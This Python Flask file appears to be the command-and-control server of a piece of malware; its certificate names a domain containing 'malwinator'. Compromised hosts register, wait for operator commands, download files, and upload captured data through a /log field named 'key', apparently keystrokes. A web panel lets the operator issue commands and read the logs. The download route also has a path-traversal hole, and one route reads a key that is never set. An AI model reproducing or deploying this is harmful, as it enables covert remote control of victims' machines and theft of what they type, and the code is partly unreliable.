from flask import Flask, request, send_file, render_template, Response
import os, time
import threading

app = Flask(__name__)

hosts = {}

#host routes
@app.route('/handshake', methods = ['POST'])
def handshake():
  global hosts
  key = (request.remote_addr, request.form['name'])
  hosts[key] = {'lock' : threading.Lock(), 'command' : '', 'status' : 'Not ready', 'log' : ['']}
  hosts[key]['lock'].acquire()
  return 'Request accepted', 200

@app.route('/download', methods = ['POST'])
def download():
  file = request.form['file']
  path = './resources/' + file
  if os.path.exists(path):
    return send_file(path, as_attachment = True)
  else:
    return 'File not found', 404

@app.route('/ready', methods = ['POST'])
def timeout():
  global hosts
  key = (request.remote_addr, request.form['name'])
  hosts[key]['lock'].acquire()
  return hosts[key]['command'], 200

@app.route('/pong', methods = ['POST'])
def pong():
  global hosts
  key = (request.remote_addr, request.form['name'])
  hosts[key]['status'] = 'Ready'
  return 'Pong sent.', 200

@app.route('/log', methods = ['POST'])
def log_post():
  global hosts
  key = (request.remote_addr, request.form['name'])
  hosts[key]['log'].append(request.form['key'])
  return 'Ok', 200

#interface routes
@app.route('/')
def displayHosts():
  global hosts
  for host in hosts:
    hosts[host]['command'] = 'ping'
    hosts[host]['status'] = 'Not ready'
    if hosts[host]['lock'].locked():
      hosts[host]['lock'].release()

  time.sleep(1)

  keys = []
  for ip, name in hosts:
    keys.append((ip, name, hosts[(ip,name)]['status']))

  return render_template('index.html', keys = keys)

@app.route('/send', methods = ['GET'])
def send_form():
  global hosts
  name = request.args.get('name')
  ip = request.args.get('ip')
  return render_template('form.html', name = name, ip = ip)

@app.route('/send', methods = ['POST'])
def send_process():
  global hosts
  name = request.args.get('name')
  ip = request.args.get('ip')
  key = (ip, name)
  command = request.form['command'] 
  if command == 'log':
    return render_template('log.html', name = name, ip = ip)
  hosts[key]['command'] = command
  if hosts[key]['lock'].locked():
    hosts[key]['lock'].release()
  else:
    return 'Host offline'
  time.sleep(2)
  return render_template('form.html', name = name, ip = ip, status = hosts[key]['ping'])

@app.route('/getLog', methods = ['POST'])
def getLog():
  global hosts
  name = request.form['name']
  ip = request.form['ip']
  key = (ip, name)
  return ''.join(hosts[key]['log'])

if __name__ == '__main__':
  app.run(ssl_context=('/etc/letsencrypt/live/malwinator.chickenkiller.com/fullchain.pem', '/etc/letsencrypt/live/malwinator.chickenkiller.com/privkey.pem'), debug=False, host='192.168.0.100', port='8082')